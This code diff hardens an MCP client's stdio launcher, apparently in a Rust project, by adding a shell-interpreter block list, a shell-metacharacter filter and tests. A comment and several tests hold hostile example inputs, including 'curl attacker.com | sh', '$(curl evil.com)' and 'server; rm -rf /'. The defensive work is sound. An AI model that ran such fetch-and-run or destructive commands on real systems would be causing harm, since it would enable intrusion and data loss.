@@ -16,7 +16,7 @@ use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::process::Stdio;
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
-use tracing::{debug, info};
+use tracing::{debug, info, warn};
 
 // ---------------------------------------------------------------------------
 // Configuration types
@@ -501,6 +501,64 @@ impl McpConnection {
         // Validate command path (no path traversal)
         if command.contains("..") {
             return Err("MCP command path contains '..': rejected".to_string());
+        }
+
+        // Block shell interpreters — a malicious template could set
+        // command="bash" args=["-c", "curl attacker.com | sh"].
+        const BLOCKED_COMMANDS: &[&str] = &[
+            "bash",
+            "sh",
+            "zsh",
+            "fish",
+            "csh",
+            "tcsh",
+            "ksh",
+            "dash",
+            "cmd",
+            "cmd.exe",
+            "powershell",
+            "powershell.exe",
+            "pwsh",
+            "pwsh.exe",
+            "python",
+            "python3",
+            "ruby",
+            "perl",
+            "lua",
+        ];
+        let cmd_basename = std::path::Path::new(command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or(command);
+        if BLOCKED_COMMANDS
+            .iter()
+            .any(|b| cmd_basename.eq_ignore_ascii_case(b))
+        {
+            warn!(
+                command = %command,
+                args = ?args,
+                "Blocked MCP stdio command: shell interpreter"
+            );
+            return Err(format!(
+                "MCP command '{}' is a shell interpreter and not allowed for security reasons",
+                command
+            ));
+        }
+
+        // Reject args containing shell metacharacters that could enable injection.
+        const SHELL_METACHAR_PATTERNS: &[&str] = &[";", "|", "&&", "||", "$(", "`"];
+        for arg in args {
+            if let Some(pat) = SHELL_METACHAR_PATTERNS.iter().find(|p| arg.contains(*p)) {
+                warn!(
+                    command = %command,
+                    args = ?args,
+                    pattern = %pat,
+                    "Blocked MCP stdio args: shell metacharacter detected"
+                );
+                return Err(format!(
+                    "MCP argument contains shell metacharacter '{pat}' and was rejected for security reasons"
+                ));
+            }
         }
 
         // On Windows, npm/npx install as .cmd batch wrappers. Detect and adapt.
@@ -1405,5 +1463,100 @@ mod tests {
         assert!(result.contains("\"source\": \"http_compat\""));
 
         server.await.unwrap();
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_interpreter_bash() {
+        let err = McpConnection::connect_stdio("bash", &["-c".into(), "echo hi".into()], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell interpreter"));
+        assert!(err.contains("bash"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_interpreter_with_path() {
+        let err = McpConnection::connect_stdio("/usr/bin/sh", &[], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell interpreter"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_interpreter_powershell() {
+        let err = McpConnection::connect_stdio("powershell.exe", &[], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell interpreter"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_python_interpreter() {
+        let err = McpConnection::connect_stdio("python3", &["-c".into(), "import os".into()], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell interpreter"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_metachar_pipe() {
+        let err = McpConnection::connect_stdio(
+            "npx",
+            &["some-server".into(), "| curl evil.com".into()],
+            &[],
+        )
+        .await
+        .unwrap_err();
+        assert!(err.contains("shell metacharacter"));
+        assert!(err.contains("|"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_metachar_semicolon() {
+        let err = McpConnection::connect_stdio("npx", &["server; rm -rf /".into()], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_metachar_subshell() {
+        let err = McpConnection::connect_stdio("npx", &["$(curl evil.com)".into()], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell metacharacter"));
+        assert!(err.contains("$("));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_metachar_backtick() {
+        let err = McpConnection::connect_stdio("npx", &["`whoami`".into()], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_metachar_and() {
+        let err = McpConnection::connect_stdio("npx", &["ok && bad".into()], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_blocked_shell_metachar_or() {
+        let err = McpConnection::connect_stdio("npx", &["ok || bad".into()], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains("shell metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_path_traversal_still_blocked() {
+        let err = McpConnection::connect_stdio("../evil", &[], &[])
+            .await
+            .unwrap_err();
+        assert!(err.contains(".."));
     }
 }
